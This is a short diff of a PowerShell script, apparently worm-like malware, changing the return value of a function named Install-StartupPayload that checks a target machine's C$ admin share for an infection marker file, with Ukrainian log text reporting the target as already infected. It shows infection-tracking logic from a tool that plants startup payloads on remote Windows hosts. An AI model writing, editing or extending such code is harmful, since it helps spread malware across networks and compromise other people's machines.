@@ -189,7 +189,7 @@ function Install-StartupPayload {
     $lock_path = "\\$TargetIP\C$\Windows\Temp\wsu.lock"
     if (Test-Path $lock_path) {
         Write-Log "Target $TargetIP вже заражена (wsu.lock) — пропускаємо" -Level "WARN"
-        return "already_infected"
+        return $false
     }
 
     # Скрипти → C:\Windows\Temp (існуюча папка, не потребує створення)
